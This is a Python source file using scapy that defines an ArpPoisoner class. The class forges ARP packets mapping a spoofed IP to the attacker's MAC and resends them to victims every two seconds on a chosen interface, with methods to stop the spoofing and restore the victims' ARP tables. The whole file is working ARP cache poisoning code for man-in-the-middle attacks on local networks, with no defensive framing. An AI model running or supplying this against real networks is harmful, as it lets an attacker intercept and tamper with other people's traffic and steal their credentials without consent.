from scapy.all import *
import multiprocessing
import threading
import time
import os

class ArpPoisoner(multiprocessing.Process):

    def __init__(self, interface):

        multiprocessing.Process.__init__(self)

        self.interface = interface
        self.packets = []    #The packets which will be used to spoof

        self.exit = multiprocessing.Event()

    def add_packet(self, mac_attacker, mac_victim, ip_to_spoof, ip_victim):
        """"Creates an ARP packet that gets added to the packets list to be used for spoofing""" 
        
        #Initialize packet
        packet = Ether()/ARP()    
        #Set values for the mac and ip addresses
        packet[Ether].src = mac_attacker
        packet[ARP].hwsrc = mac_attacker
        packet[ARP].hwdst = mac_victim
        packet[ARP].psrc  = ip_to_spoof
        packet[ARP].pdst  = ip_victim

        self.packets.append(packet)

    def clear_packets(self):
        """Empties the packets list"""
        self.packets = []

    def run(self):
        """"Starts sending out the spoofing packets on the interface repeatedly. Will not stop by itself."""

        self.exit.clear()

        while not self.exit.is_set():
            
            for packet in self.packets:
                sendp(packet, iface = self.interface, verbose=0)
            
            time.sleep(2)

    def restore_arp(self, mac_attacker, mac_victim, ip_victim, mac_gateway, ip_gateway):
        """Restores arp addresses to their original pre-spoof state."""
        
        #Initialize restore packets
        restore_packet_gateway = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_victim, hwdst=mac_gateway, psrc=ip_victim, pdst=ip_gateway)
        restore_packet_victim = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_gateway, hwdst=mac_victim, psrc=ip_gateway, pdst=ip_victim) 

        sendp(restore_packet_gateway, iface = self.interface, verbose=0)
        sendp(restore_packet_victim, iface = self.interface, verbose=0)
    
        print "Restored ARP tables"

    def stop(self):
        """Stops the sending of the spoofing packets."""
        self.exit.set()
